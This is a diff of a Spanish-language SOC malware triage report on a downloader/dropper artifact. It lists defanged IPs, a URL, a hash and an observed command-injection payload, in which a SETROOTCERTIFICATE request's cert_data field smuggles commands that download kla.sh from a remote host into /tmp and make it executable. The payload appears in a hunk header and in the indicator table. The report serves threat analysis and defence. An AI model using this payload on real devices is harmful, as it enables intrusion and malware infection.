@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 253 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kla.sh` en `hxxp://89.32.41.XXX/bins/kla.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:01:00+00:00`
+- **Registrado:** `2026-08-09T20:01:00.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,11 +54,11 @@ action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://89.32.41.XXX/bins/kla.sh | strings |
 | ip | 154.168.179.XXX | static_analysis |
 | ip | 89.32.41.XXX | static_analysis |
-| url | hxxp://89.32.41.XXX/bins/kla.sh | strings |
-| hash | 041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8 | static_analysis |
 | command | action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp://89.32.41.XXX/bins/kla.sh -O k;chmod +x | strings |
+| hash | 041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8 | static_analysis |
 | ip | 85.103.42.XXX | artifact_source |
 
 ## 🔎 Triage
